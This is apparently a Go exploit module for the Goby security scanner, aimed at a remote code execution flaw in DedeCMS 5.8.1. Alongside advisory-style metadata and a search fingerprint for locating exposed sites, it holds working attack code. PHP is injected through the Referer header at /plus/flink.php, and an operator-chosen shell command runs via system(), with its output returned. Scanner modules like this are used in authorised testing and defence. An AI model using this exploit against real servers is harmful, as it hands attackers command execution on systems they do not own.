package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DedeCMS 5.8.1 RCE",
    "Description": "<p>DedeCMS is an open source content management system.</p><p>DedeCMS content management system 5.8.1 internal test version common.func.php has a code execution vulnerability. Attackers can use this vulnerability to gain server control permissions.</p>",
    "Impact": "DedeCMS 5.8.1 RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.dedecms.com\">http://www.dedecms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "DedeCMS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "DedeCMS 内容管理系统5.8.1版本远程代码执行漏洞",
            "Description": "<p>DedeCMS是一款开源的内容管理系统。</p><p>DedeCMS内容管理系统5.8.1内测版本common.func.php文件存在代码执行漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Impact": "<p>DedeCMS内容管理系统5.8.1内测版本common.func.php存在代码执行漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"http://www.dedecms.com\">http://www.dedecms.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "DedeCMS",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "DedeCMS 5.8.1 RCE",
            "Description": "<p>DedeCMS is an open source content management system.</p><p>DedeCMS content management system 5.8.1 internal test version common.func.php has a code execution vulnerability. Attackers can use this vulnerability to gain server control permissions.</p>",
            "Impact": "DedeCMS 5.8.1 RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.dedecms.com\">http://www.dedecms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "DedeCMS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "GobyQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.dedecms.com",
    "DisclosureDate": "2021-10-02",
    "References": [
        "https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "DedeCMS"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10230"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/plus/flink.php?dopost=save&c=id"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Referer", "<?php echo \"md5\"(333);?>")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "310dcbbf4cce62f762a2aaa148d556bd") {
					return true
				}
			}
			uri2 := "/plus/vote.php?dopost=view"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Referer", "<?php echo \"md5\"(333);?>")
			cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "310dcbbf4cce62f762a2aaa148d556bd") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/plus/flink.php?dopost=save&c=id"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Referer", "<?php \"system\"("+cmd+");?>")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					body := regexp.MustCompile("if\\(pgo==0\\){ location='((.||\\n)*?)'; pgo=1;").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
